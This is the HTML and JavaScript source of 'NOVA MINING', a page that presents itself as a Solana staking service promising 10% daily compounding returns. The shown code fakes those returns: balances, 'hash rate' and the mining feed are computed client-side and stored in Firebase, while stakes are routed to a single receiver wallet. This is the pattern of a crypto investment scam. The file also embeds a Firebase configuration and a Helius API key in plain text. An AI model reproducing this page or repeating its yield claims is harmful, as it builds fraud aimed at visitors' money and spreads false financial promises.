<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">

<title>NOVA MINING | Stake Solana Up To 2.50x Daily</title>

<!-- Primary SEO -->
<meta name="description" content="NOVA MINING is a real SOL staking platform. Stake Solana and earn up to 2.50x daily rewards. Secure blockchain-powered staking with high-performance mining system.">
<meta name="keywords" content="Solana staking, SOL staking platform, stake SOL daily, Solana mining, crypto passive income, blockchain rewards, SOL investment, Nova Mining">
<meta name="author" content="NOVA MINING">
<meta name="robots" content="index, follow">

<!-- Favicon -->
<link rel="icon" type="image/jpeg" href="images/favicon1.png">
<link rel="shortcut icon" type="image/jpeg/" href="images/favicon1.png">
<link rel="apple-touch-icon" href="images/favicon1.png">

<!-- Open Graph (Facebook / Discord / Messenger Preview) -->
<meta property="og:title" content="NOVA MINING | Stake Solana Up To 2.50x Daily">
<meta property="og:description" content="Stake Solana and earn up to 2.50x daily rewards with NOVA MINING. Secure, fast and blockchain-powered SOL staking platform.">
<meta property="og:type" content="website">
<meta property="og:image" content="https://xyzinnovagence.xyz/images/favicon1.png">
<meta property="og:url" content="https://xyzinnovagence.xyz/">

<!-- Twitter Card -->
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="NOVA MINING | Stake Solana Up To 2.50x Daily">
<meta name="twitter:description" content="Earn up to 2.50x daily by staking SOL on NOVA MINING. Secure blockchain staking system.">
<meta name="twitter:image" content="https://xyzinnovagence.xyz/images/favicon1.png">

<!-- Performance -->
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

<!-- Fonts & Icons -->
<link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    
    <style>
        /* Copy all the CSS from the previous version - it's working fine */
        :root {
            --primary-glow: rgba(0, 255, 255, 0.6);
            --secondary-glow: rgba(0, 150, 255, 0.4);
            --bg-dark: #030b14;
            --card-bg: rgba(8, 25, 40, 0.6);
            --border-color: rgba(0, 255, 255, 0.25);
            --text-primary: #ffffff;
            --text-secondary: #b0e0ff;
            --accent-cyan: #00ffff;
            --accent-blue: #0088ff;
            --success-green: #00ffaa;
            --warning-gold: #ffd700;
            --error-red: #ff4d4d;
            --spacing-xs: clamp(0.25rem, 1vw, 0.5rem);
            --spacing-sm: clamp(0.5rem, 2vw, 0.75rem);
            --spacing-md: clamp(0.75rem, 3vw, 1rem);
            --spacing-lg: clamp(1rem, 4vw, 1.5rem);
            --spacing-xl: clamp(1.5rem, 5vw, 2rem);
            --font-size-xs: clamp(0.7rem, 2vw, 0.8rem);
            --font-size-sm: clamp(0.8rem, 2.5vw, 0.9rem);
            --font-size-md: clamp(0.9rem, 3vw, 1rem);
            --font-size-lg: clamp(1.1rem, 4vw, 1.3rem);
            --font-size-xl: clamp(1.5rem, 6vw, 2rem);
            --font-size-xxl: clamp(1.8rem, 7vw, 2.5rem);
            --border-radius-sm: clamp(0.8rem, 3vw, 1rem);
            --border-radius-md: clamp(1rem, 4vw, 1.5rem);
            --border-radius-lg: clamp(1.5rem, 5vw, 2rem);
            --border-radius-xl: clamp(2rem, 6vw, 3rem);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }

        body {
            min-height: 100vh;
            background: radial-gradient(circle at 0% 0%, #1a3a4f, #0b1f30, #030b14);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: var(--spacing-md);
        }

        .mining-app {
            width: 100%;
            max-width: 1200px;
            margin: 0 auto;
        }

        .glass-panel {
            width: 100%;
            background: rgba(5, 20, 30, 0.35);
            backdrop-filter: blur(20px) saturate(200%);
            -webkit-backdrop-filter: blur(20px) saturate(200%);
            border: 1px solid var(--border-color);
            border-radius: var(--border-radius-xl);
            padding: var(--spacing-xl);
            box-shadow: 0 30px 60px -20px rgba(0, 0, 0, 0.8), 
                        0 0 0 1px rgba(0, 255, 255, 0.1) inset,
                        0 0 40px rgba(0, 255, 255, 0.1);
        }

        .mining-header {
            text-align: center;
            margin-bottom: var(--spacing-xl);
            position: relative;
        }

        .mining-header h1 {
            font-size: var(--font-size-xxl);
            font-weight: 800;
            background: linear-gradient(135deg, #7ff0ff, #4da8ff, #00ccff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 30px rgba(0, 255, 255, 0.5);
            letter-spacing: 2px;
            margin-bottom: var(--spacing-xs);
            animation: glowPulse 3s infinite;
        }

        @keyframes glowPulse {
            0%, 100% { filter: drop-shadow(0 0 20px rgba(0, 255, 255, 0.3)); }
            50% { filter: drop-shadow(0 0 40px rgba(0, 255, 255, 0.7)); }
        }

        .mining-header p {
            color: var(--text-secondary);
            font-size: var(--font-size-sm);
            opacity: 0.9;
            letter-spacing: 1px;
        }

        .wallet-section {
            background: var(--card-bg);
            border-radius: var(--border-radius-lg);
            padding: var(--spacing-lg);
            margin-bottom: var(--spacing-lg);
            border: 1px solid var(--border-color);
            transition: all 0.3s ease;
        }

        .wallet-container {
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: var(--spacing-md);
        }

        .wallet-badge {
            display: flex;
            align-items: center;
            gap: var(--spacing-sm);
            background: rgba(0, 255, 255, 0.08);
            padding: var(--spacing-sm) var(--spacing-md);
            border-radius: var(--border-radius-xl);
            border: 1px solid rgba(0, 255, 255, 0.2);
        }

        .wallet-badge i {
            font-size: var(--font-size-lg);
            color: var(--accent-cyan);
            filter: drop-shadow(0 0 10px cyan);
        }

        .wallet-badge span {
            font-size: var(--font-size-md);
            font-weight: 600;
            color: var(--text-primary);
        }

        .wallet-address-container {
            display: flex;
            align-items: center;
            gap: var(--spacing-sm);
            flex-wrap: wrap;
        }

        .wallet-address {
            font-size: var(--font-size-sm);
            background: rgba(0, 0, 0, 0.5);
            padding: var(--spacing-sm) var(--spacing-md);
            border-radius: var(--border-radius-xl);
            border: 1px solid rgba(0, 255, 255, 0.3);
            color: #a5f0ff;
            font-family: monospace;
            letter-spacing: 1px;
            word-break: break-all;
        }

        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: var(--spacing-xs);
            padding: var(--spacing-xs) var(--spacing-sm);
            border-radius: var(--border-radius-xl);
            font-size: var(--font-size-xs);
            font-weight: 600;
        }

        .status-active {
            background: rgba(0, 255, 170, 0.15);
            border: 1px solid #00ffaa;
            color: #00ffaa;
        }

        .btn {
            background: rgba(0, 150, 255, 0.15);
            border: 1px solid rgba(0, 255, 255, 0.4);
            color: white;
            padding: var(--spacing-sm) var(--spacing-lg);
            border-radius: var(--border-radius-xl);
            font-weight: 600;
            font-size: var(--font-size-md);
            cursor: pointer;
            backdrop-filter: blur(4px);
            transition: all 0.2s ease;
            box-shadow: 0 4px 15px rgba(0, 100, 255, 0.2);
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: var(--spacing-sm);
            min-height: 48px;
            -webkit-tap-highlight-color: transparent;
            user-select: none;
        }

        .btn:active {
            transform: scale(0.97);
        }

        .btn-primary {
            background: linear-gradient(135deg, rgba(0, 200, 255, 0.4), rgba(0, 100, 255, 0.4));
            border-color: var(--accent-cyan);
            box-shadow: 0 0 30px rgba(0, 255, 255, 0.3);
        }

        .btn-danger {
            background: rgba(255, 80, 80, 0.2);
            border-color: #ff4d4d;
            color: #ffb3b3;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(min(100%, 180px), 1fr));
            gap: var(--spacing-md);
            margin: var(--spacing-lg) 0;
        }

        .stat-card {
            background: rgba(0, 20, 35, 0.7);
            backdrop-filter: blur(5px);
            border-radius: var(--border-radius-lg);
            padding: var(--spacing-lg);
            text-align: center;
            border: 1px solid rgba(0, 255, 200, 0.2);
            transition: transform 0.2s ease;
        }

        .stat-card:active {
            transform: translateY(-2px);
        }

        .stat-icon {
            font-size: calc(var(--font-size-xl) * 1.5);
            color: var(--accent-cyan);
            margin-bottom: var(--spacing-sm);
            filter: drop-shadow(0 0 15px cyan);
        }

        .stat-value {
            font-size: var(--font-size-xl);
            font-weight: 700;
            color: white;
            line-height: 1.2;
            text-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
            word-break: break-word;
        }

        .stat-label {
            font-size: var(--font-size-xs);
            color: var(--text-secondary);
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-top: var(--spacing-xs);
        }

        .mining-power-card {
            background: rgba(0, 15, 25, 0.8);
            border-radius: var(--border-radius-lg);
            padding: var(--spacing-lg);
            margin: var(--spacing-lg) 0;
            border: 1px solid rgba(0, 255, 255, 0.2);
        }

        .power-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: var(--spacing-sm);
            font-size: var(--font-size-md);
            color: var(--text-secondary);
            flex-wrap: wrap;
            gap: var(--spacing-sm);
        }

        .power-bar-container {
            width: 100%;
            height: 24px;
            background: rgba(0, 0, 0, 0.6);
            border-radius: var(--border-radius-xl);
            overflow: hidden;
            border: 1px solid rgba(0, 255, 255, 0.3);
        }

        .power-bar-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #00ffaa, #00ffff, #0088ff);
            border-radius: var(--border-radius-xl);
            transition: width 0.5s ease;
            box-shadow: 0 0 20px cyan;
        }

        .tier-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: var(--spacing-md);
            margin: var(--spacing-lg) 0;
            padding: var(--spacing-md);
            background: rgba(0, 10, 20, 0.6);
            border-radius: var(--border-radius-lg);
        }

        .tier-badge {
            display: flex;
            align-items: center;
            gap: var(--spacing-sm);
            padding: var(--spacing-sm) var(--spacing-md);
            background: rgba(255, 215, 0, 0.1);
            border: 1px solid gold;
            border-radius: var(--border-radius-xl);
            font-weight: 600;
            font-size: var(--font-size-md);
        }

        .tier-badge i {
            color: gold;
        }

        .boost-multiplier {
            color: gold;
            font-weight: 700;
            animation: boostPulse 2s infinite;
        }

        @keyframes boostPulse {
            0%, 100% { text-shadow: 0 0 5px gold; }
            50% { text-shadow: 0 0 20px gold; }
        }

        .stake-container {
            margin: var(--spacing-lg) 0;
        }

        .stake-label {
            display: flex;
            align-items: center;
            gap: var(--spacing-sm);
            margin-bottom: var(--spacing-sm);
            color: var(--text-secondary);
            font-size: var(--font-size-md);
        }

        .input-group {
            display: flex;
            align-items: stretch;
            gap: var(--spacing-sm);
            flex-wrap: wrap;
        }

        .stake-input-wrapper {
            flex: 3;
            min-width: 200px;
            display: flex;
            background: rgba(0, 0, 0, 0.5);
            border-radius: var(--border-radius-xl);
            border: 1px solid rgba(0, 255, 255, 0.3);
            overflow: hidden;
        }

        .stake-input {
            flex: 1;
            background: transparent;
            border: none;
            padding: var(--spacing-md);
            font-size: var(--font-size-lg);
            font-weight: 600;
            color: white;
            outline: none;
            min-width: 120px;
        }

        .stake-input::placeholder {
            color: rgba(180, 210, 240, 0.4);
        }

        .stake-unit {
            display: flex;
            align-items: center;
            padding: 0 var(--spacing-md);
            background: rgba(0, 100, 200, 0.3);
            color: var(--accent-cyan);
            font-weight: 700;
            border-left: 1px solid rgba(0, 255, 255, 0.3);
        }

        .quick-stake-buttons {
            display: flex;
            gap: var(--spacing-sm);
            flex-wrap: wrap;
            margin: var(--spacing-md) 0;
        }

        .quick-btn {
            flex: 1;
            min-width: 80px;
            background: rgba(0, 100, 200, 0.2);
            border: 1px solid rgba(0, 255, 255, 0.3);
            padding: var(--spacing-sm);
            border-radius: var(--border-radius-xl);
            color: white;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }

        .quick-btn:active {
            background: rgba(0, 200, 255, 0.3);
        }

        .feed-container {
            background: rgba(0, 0, 0, 0.4);
            border-radius: var(--border-radius-lg);
            padding: var(--spacing-md);
            margin-top: var(--spacing-lg);
            border: 1px solid rgba(0, 255, 255, 0.2);
        }

        .feed-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: var(--spacing-md);
            color: var(--text-secondary);
            font-size: var(--font-size-sm);
            flex-wrap: wrap;
            gap: var(--spacing-sm);
        }

        .hash-rate {
            color: var(--success-green);
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: var(--spacing-xs);
        }

        .mining-feed {
            max-height: 120px;
            overflow-y: auto;
            scrollbar-width: thin;
            scrollbar-color: var(--accent-cyan) rgba(0, 0, 0, 0.3);
        }

        .mining-feed::-webkit-scrollbar {
            width: 4px;
        }

        .mining-feed::-webkit-scrollbar-track {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 4px;
        }

        .mining-feed::-webkit-scrollbar-thumb {
            background: var(--accent-cyan);
            border-radius: 4px;
        }

        .feed-item {
            padding: var(--spacing-xs) 0;
            color: var(--text-secondary);
            font-size: var(--font-size-xs);
            display: flex;
            align-items: center;
            gap: var(--spacing-sm);
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }

        .feed-item i {
            font-size: var(--font-size-xs);
        }

        .feed-item .success { color: var(--success-green); }
        .feed-item .mining { color: var(--warning-gold); }
        .feed-item .info { color: var(--accent-cyan); }
        .feed-item .warning { color: #ff6b6b; }

        .transaction-status {
            position: fixed;
            bottom: 20px;
            right: 20px;
            max-width: 350px;
            padding: 16px 20px;
            border-radius: 12px;
            background: rgba(10, 25, 40, 0.95);
            backdrop-filter: blur(10px);
            border: 1px solid var(--border-color);
            color: white;
            font-size: 14px;
            z-index: 2000;
            display: none;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            animation: slideIn 0.3s ease;
        }

        .transaction-status.success {
            border-left: 4px solid var(--success-green);
        }

        .transaction-status.error {
            border-left: 4px solid var(--error-red);
        }

        .transaction-status.info {
            border-left: 4px solid var(--accent-cyan);
        }

        @keyframes slideIn {
            from {
                transform: translateX(100%);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }

        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(3, 10, 18, 0.9);
            backdrop-filter: blur(10px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s;
            padding: var(--spacing-md);
        }

        .modal-overlay.active {
            opacity: 1;
            pointer-events: all;
        }

        .modal-card {
            background: rgba(10, 25, 40, 0.95);
            backdrop-filter: blur(30px);
            border: 1px solid var(--accent-cyan);
            border-radius: var(--border-radius-lg);
            padding: var(--spacing-xl);
            max-width: 450px;
            width: 100%;
            max-height: 90vh;
            overflow-y: auto;
            box-shadow: 0 30px 60px #00000080, 0 0 50px rgba(0, 255, 255, 0.2);
        }

        .modal-header {
            display: flex;
            align-items: center;
            gap: var(--spacing-md);
            margin-bottom: var(--spacing-lg);
        }

        .modal-header i {
            font-size: var(--font-size-xl);
            color: var(--accent-cyan);
        }

        .modal-header h3 {
            font-size: var(--font-size-lg);
            color: white;
        }

        .modal-body {
            margin-bottom: var(--spacing-lg);
        }

        .modal-detail {
            background: #0a1c2b;
            border-radius: var(--border-radius-md);
            padding: var(--spacing-lg);
            word-break: break-word;
            border: 1px solid #214767;
            font-size: var(--font-size-sm);
            white-space: pre-wrap;
        }

        .modal-footer {
            display: flex;
            justify-content: flex-end;
            gap: var(--spacing-md);
        }

        .app-footer {
            margin-top: var(--spacing-lg);
            text-align: center;
            color: rgba(176, 224, 255, 0.5);
            font-size: var(--font-size-xs);
        }

        .flex-row {
            display: flex;
            align-items: center;
            gap: var(--spacing-md);
            flex-wrap: wrap;
        }

        .min-stake-notice {
            background: rgba(255, 215, 0, 0.1);
            border: 1px solid rgba(255, 215, 0, 0.3);
            border-radius: var(--border-radius-md);
            padding: var(--spacing-sm) var(--spacing-md);
            margin: var(--spacing-sm) 0;
            color: var(--warning-gold);
            font-size: var(--font-size-sm);
            display: flex;
            align-items: center;
            gap: var(--spacing-sm);
        }
    </style>
</head>
<body>
    <div class="mining-app">
        <div class="glass-panel">
            <!-- Header -->
            <div class="mining-header">
                <h1>âš¡ NOVA MINING</h1>
                <p>real solana staking Â· 10% daily Â· tier boosts</p>
            </div>

            <!-- Wallet Section -->
            <div class="wallet-section">
                <div class="wallet-container">
                    <div class="wallet-badge">
                        <i class="fas fa-bolt"></i>
                        <span>MINING RIG</span>
                    </div>
                    <button class="btn" id="connectWalletBtn">
                        <i class="fab fa-phantom"></i>
                        <span class="btn-text">CONNECT PHANTOM</span>
                    </button>
                </div>
                
                <div id="walletInfo" style="display: none;" class="mt-2">
                    <div class="wallet-address-container">
                        <div class="wallet-address" id="walletAddressDisplay"></div>
                        <span class="status-badge status-active">
                            <i class="fas fa-circle"></i> MINING
                        </span>
                    </div>
                </div>
            </div>

            <!-- Mining Stats Grid -->
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-icon"><i class="fas fa-coins"></i></div>
                    <div class="stat-value" id="totalStakedDisplay">0.0000</div>
                    <div class="stat-label">STAKED SOL</div>
                </div>
                
                <div class="stat-card">
                    <div class="stat-icon"><i class="fas fa-chart-line"></i></div>
                    <div class="stat-value" id="dailyRewardDisplay">0.0000</div>
                    <div class="stat-label">DAILY REWARD</div>
                </div>
                
                <div class="stat-card">
                    <div class="stat-icon"><i class="fas fa-gauge-high"></i></div>
                    <div class="stat-value" id="miningSpeed">0.0000</div>
                    <div class="stat-label">SOL/HR</div>
                </div>
            </div>

            <!-- Mining Power Bar -->
            <div class="mining-power-card">
                <div class="power-header">
                    <span><i class="fas fa-bolt"></i> MINING POWER</span>
                    <span id="powerPercentage">0%</span>
                </div>
                <div class="power-bar-container">
                    <div class="power-bar-fill" id="powerFill" style="width: 0%;"></div>
                </div>
            </div>

            <!-- Tier & Boost Info -->
            <div class="tier-container">
                <div class="tier-badge">
                    <i class="fas fa-crown"></i>
                    <span id="minerTier">BRONZE MINER</span>
                </div>
                <div class="flex-row">
                    <span style="color: var(--text-secondary);">BOOST:</span>
                    <span class="boost-multiplier" id="boostMultiplier">1.0x</span>
                </div>
                <div style="color: var(--text-secondary);" id="nextTierInfo">
                    <i class="fas fa-arrow-up"></i> 0/10 SOL
                </div>
            </div>

            <!-- Stake Controls -->
            <div class="stake-container">
                <div class="stake-label">
                    <i class="fas fa-microchip"></i>
                    <span>ADD MINING POWER</span>
                </div>
                
                <div class="min-stake-notice">
                    <i class="fas fa-info-circle"></i>
                    <span>Minimum stake: 0.5 SOL (~$100 USD)</span>
                </div>
                
                <div class="input-group">
                    <div class="stake-input-wrapper">
                        <input type="number" id="stakeAmount" class="stake-input" placeholder="0.5" min="0.5" step="0.1" value="0.5">
                        <span class="stake-unit">SOL</span>
                    </div>
                    <button class="btn btn-primary" id="stakeBtn" style="flex: 1; min-width: 120px;">
                        <i class="fa-solid fa-bolt"></i>
                        <span>MINE</span>
                    </button>
                </div>

                <div class="quick-stake-buttons">
                    <button class="quick-btn" id="quickStake0_5">+0.5 SOL</button>
                    <button class="quick-btn" id="quickStake1">+1 SOL</button>
                    <button class="quick-btn" id="quickStake5">+5 SOL</button>
                    <button class="quick-btn" id="quickStake10">+10 SOL</button>
                </div>
            </div>

            <!-- Live Mining Feed -->
            <div class="feed-container">
                <div class="feed-header">
                    <span><i class="fas fa-wave-square"></i> LIVE MINING FEED</span>
                    <span class="hash-rate" id="hashRate">âš¡ 0 H/s</span>
                </div>
                <div class="mining-feed" id="miningFeed">
                    <div class="feed-item">
                        <i class="fas fa-circle info"></i>
                        <span>system online Â· waiting for miner...</span>
                    </div>
                </div>
            </div>

            <!-- Last Update -->
            <div class="flex-row" style="justify-content: space-between; margin-top: var(--spacing-md); padding-top: var(--spacing-md); border-top: 1px solid rgba(0,255,255,0.1);">
                <span style="color: var(--text-secondary);"><i class="fa-regular fa-clock"></i> LAST MINING CYCLE</span>
                <span style="color: var(--text-secondary);" id="lastUpdateTimestamp">â€”</span>
            </div>

            <!-- Footer -->
            <div class="app-footer">
                <i class="fa-regular fa-gem"></i> mining pool: AMC3gY5q...JyeJc Â· 10% daily compound with tier boosts
            </div>
        </div>
    </div>

    <!-- Transaction Status Toast -->
    <div id="transactionStatus" class="transaction-status"></div>

    <!-- Confirmation Modal -->
    <div class="modal-overlay" id="confirmModal">
        <div class="modal-card">
            <div class="modal-header">
                <i class="fa-solid fa-circle-check" style="color: var(--warning-gold);"></i>
                <h3>CONFIRM STAKE</h3>
            </div>
            <div class="modal-body">
                <div id="confirmMessage" style="margin-bottom: var(--spacing-md); color: var(--text-secondary);"></div>
                <div class="modal-detail" id="confirmDetail"></div>
            </div>
            <div class="modal-footer">
                <button class="btn btn-danger" id="cancelConfirmBtn">CANCEL</button>
                <button class="btn btn-primary" id="approveConfirmBtn">APPROVE</button>
            </div>
        </div>
    </div>

    <!-- Transaction Progress Modal -->
    <div class="modal-overlay" id="txModal">
        <div class="modal-card">
            <div class="modal-header">
                <i class="fa-solid fa-bolt"></i>
                <h3 id="txModalTitle">TRANSACTION</h3>
            </div>
            <div class="modal-body">
                <div id="modalMessage" style="margin-bottom: var(--spacing-md); color: var(--text-secondary);"></div>
                <div class="modal-detail" id="modalDetail"></div>
            </div>
            <div class="modal-footer">
                <button class="btn" id="modalCloseBtn">CLOSE</button>
            </div>
        </div>
    </div>

    <!-- Solana Web3.js -->
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>

    <!-- Firebase -->
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>

    <script>
        // Firebase Configuration
        const firebaseConfig = {
            apiKey: "AIzaSyCck4gA4cLcJfir9nJAigdZrVC8r91gciE",
            authDomain: "nova-e6655.firebaseapp.com",
            databaseURL: "https://nova-e6655-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "nova-e6655",
            storageBucket: "nova-e6655.firebasestorage.app",
            messagingSenderId: "111451913127",
            appId: "1:111451913127:web:8cb6c4f1715daf0ff69482"
        };
        
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        // Solana Configuration
        const RECEIVER_ADDRESS = "AMC3gY5qJxxF6sNcPzzsmFvpucJJvBydLCiZggaJyeJc";
        const MIN_STAKE_SOL = 0.5;
        const HELIUS_RPC = "https://mainnet.helius-rpc.com/?api-key=a6328d07-7441-42c2-afb0-3bcd6a932c17";
        
        // State
        let walletAddress = null;
        let userDocRef = null;
        let miningInterval = null;
        let feedItems = [];

        // UI Elements
        const connectBtn = document.getElementById('connectWalletBtn');
        const walletInfoDiv = document.getElementById('walletInfo');
        const walletAddrSpan = document.getElementById('walletAddressDisplay');
        const stakeBtn = document.getElementById('stakeBtn');
        const stakeAmountInput = document.getElementById('stakeAmount');
        const totalStakedSpan = document.getElementById('totalStakedDisplay');
        const dailyRewardSpan = document.getElementById('dailyRewardDisplay');
        const miningSpeedSpan = document.getElementById('miningSpeed');
        const powerFill = document.getElementById('powerFill');
        const powerPercentage = document.getElementById('powerPercentage');
        const minerTierSpan = document.getElementById('minerTier');
        const nextTierInfo = document.getElementById('nextTierInfo');
        const boostMultiplierSpan = document.getElementById('boostMultiplier');
        const hashRateSpan = document.getElementById('hashRate');
        const miningFeed = document.getElementById('miningFeed');
        const lastUpdateSpan = document.getElementById('lastUpdateTimestamp');
        
        // Modal elements
        const confirmModal = document.getElementById('confirmModal');
        const confirmMessage = document.getElementById('confirmMessage');
        const confirmDetail = document.getElementById('confirmDetail');
        const cancelConfirmBtn = document.getElementById('cancelConfirmBtn');
        const approveConfirmBtn = document.getElementById('approveConfirmBtn');
        
        const txModal = document.getElementById('txModal');
        const txModalTitle = document.getElementById('txModalTitle');
        const modalMessage = document.getElementById('modalMessage');
        const modalDetail = document.getElementById('modalDetail');
        const modalClose = document.getElementById('modalCloseBtn');
        
        const transactionStatus = document.getElementById('transactionStatus');

        // Quick stake buttons
        const quickStake0_5 = document.getElementById('quickStake0_5');
        const quickStake1 = document.getElementById('quickStake1');
        const quickStake5 = document.getElementById('quickStake5');
        const quickStake10 = document.getElementById('quickStake10');

        // Helper Functions
        function showTransactionStatus(message, type = 'info') {
            transactionStatus.textContent = message;
            transactionStatus.className = 'transaction-status ' + type;
            transactionStatus.style.display = 'block';
            
            setTimeout(() => {
                transactionStatus.style.display = 'none';
            }, type === 'error' ? 8000 : 5000);
        }

        function showConfirmModal(message, detail) {
            confirmMessage.innerText = message;
            confirmDetail.innerText = detail;
            confirmModal.classList.add('active');
            
            return new Promise((resolve) => {
                const onApprove = () => {
                    cleanup();
                    resolve(true);
                };
                const onCancel = () => {
                    cleanup();
                    resolve(false);
                };
                const cleanup = () => {
                    confirmModal.classList.remove('active');
                    approveConfirmBtn.removeEventListener('click', onApprove);
                    cancelConfirmBtn.removeEventListener('click', onCancel);
                };
                
                approveConfirmBtn.addEventListener('click', onApprove);
                cancelConfirmBtn.addEventListener('click', onCancel);
            });
        }

        function showTxModal(title, message, detail) {
            txModalTitle.innerText = title;
            modalMessage.innerText = message;
            modalDetail.innerText = detail || '';
            txModal.classList.add('active');
        }

        function updateTxModal(message, detail) {
            modalMessage.innerText = message;
            if (detail) modalDetail.innerText = detail;
        }

        function hideTxModal() {
            txModal.classList.remove('active');
        }

        modalClose.addEventListener('click', hideTxModal);

        function formatAddr(addr) {
            if (!addr) return '';
            return addr.slice(0,4) + '...' + addr.slice(-4);
        }

        // Add to mining feed
        function addToFeed(message, type = 'info') {
            feedItems.unshift({ message, type });
            if (feedItems.length > 8) feedItems.pop();
            
            miningFeed.innerHTML = feedItems.map(item => {
                let iconClass = 'fa-circle info';
                if (item.type === 'success') iconClass = 'fa-check-circle success';
                else if (item.type === 'mining') iconClass = 'fa-bolt mining';
                else if (item.type === 'warning') iconClass = 'fa-exclamation-triangle warning';
                
                return `
                    <div class="feed-item">
                        <i class="fas ${iconClass}"></i>
                        <span>${item.message}</span>
                    </div>
                `;
            }).join('');
        }

        // Calculate tier and boost
        function calculateTier(totalStaked) {
            if (totalStaked >= 100) return { tier: 'DIAMOND', boost: 2.5, next: null };
            if (totalStaked >= 50) return { tier: 'PLATINUM', boost: 2.0, next: 100 };
            if (totalStaked >= 25) return { tier: 'GOLD', boost: 1.5, next: 50 };
            if (totalStaked >= 10) return { tier: 'SILVER', boost: 1.2, next: 25 };
            return { tier: 'BRONZE', boost: 1.0, next: 10 };
        }

        // Update all mining stats
        function updateMiningStats(totalStaked) {
            const powerLevel = Math.min(100, (totalStaked / 100) * 100);
            powerFill.style.width = `${powerLevel}%`;
            powerPercentage.innerText = `${Math.round(powerLevel)}%`;
            
            const tierInfo = calculateTier(totalStaked);
            minerTierSpan.innerText = tierInfo.tier + ' MINER';
            boostMultiplierSpan.innerText = tierInfo.boost + 'x';
            
            if (tierInfo.next) {
                const currentTierMin = tierInfo.tier === 'BRONZE' ? 0 : 
                                       tierInfo.tier === 'SILVER' ? 10 : 
                                       tierInfo.tier === 'GOLD' ? 25 : 50;
                const progress = totalStaked - currentTierMin;
                const needed = tierInfo.next - currentTierMin;
                nextTierInfo.innerHTML = `<i class="fas fa-arrow-up"></i> ${progress.toFixed(2)}/${needed} SOL`;
            } else {
                nextTierInfo.innerHTML = '<i class="fas fa-crown"></i> MAX TIER';
            }
            
            const hourlyRate = (totalStaked * 0.1 * tierInfo.boost) / 24;
            miningSpeedSpan.innerText = hourlyRate.toFixed(4);
            
            const hashRate = Math.round(totalStaked * 1000);
            hashRateSpan.innerHTML = `âš¡ ${hashRate.toLocaleString()} H/s`;
        }

        // Firebase Functions
        async function loadUserData(address) {
            if (!address) return null;
            
            const docId = address;
            userDocRef = db.collection('stakes').doc(docId);
            
            try {
                const doc = await userDocRef.get();
                
                if (doc.exists) {
                    addToFeed('ðŸ“Š loaded existing mining data', 'info');
                    return doc.data();
                } else {
                    const now = Date.now();
                    const newData = {
                        wallet: address,
                        totalStaked: 0,
                        lastDailyUpdate: now,
                        createdAt: firebase.firestore.FieldValue.serverTimestamp()
                    };
                    
                    await userDocRef.set(newData);
                    addToFeed('ðŸš€ new mining rig deployed', 'success');
                    return newData;
                }
            } catch (error) {
                console.error('Error loading user data:', error);
                addToFeed('âš ï¸ error loading mining data', 'warning');
                return null;
            }
        }

        // Calculate and apply daily rewards
        async function calculateDailyRewards(currentData) {
            if (!currentData) return null;
            
            const now = Date.now();
            const lastUpdate = currentData.lastDailyUpdate || now;
            const daysPassed = Math.floor((now - lastUpdate) / (86400 * 1000));
            
            if (daysPassed > 0 && currentData.totalStaked > 0) {
                let total = currentData.totalStaked;
                const tierInfo = calculateTier(total);
                
                for (let i = 0; i < daysPassed; i++) {
                    total = total * (1 + (0.1 * tierInfo.boost));
                }
                
                await userDocRef.update({
                    totalStaked: total,
                    lastDailyUpdate: now
                });
                
                addToFeed(`â›ï¸ mined ${daysPassed} day(s) Â· ${tierInfo.boost}x boost`, 'mining');
                
                return { ...currentData, totalStaked: total, lastDailyUpdate: now };
            }
            
            return currentData;
        }

        // Refresh UI with latest data
        async function refreshUserStats() {
            if (!userDocRef || !walletAddress) return;
            
            const doc = await userDocRef.get();
            if (!doc.exists) return;
            
            const data = doc.data();
            const total = data.totalStaked || 0;
            const last = data.lastDailyUpdate ? new Date(data.lastDailyUpdate).toLocaleString() : 'just now';
            
            const tierInfo = calculateTier(total);
            const dailyReward = total * 0.1 * tierInfo.boost;
            
            totalStakedSpan.innerText = total.toFixed(4);
            dailyRewardSpan.innerText = dailyReward.toFixed(4);
            lastUpdateSpan.innerText = last;
            
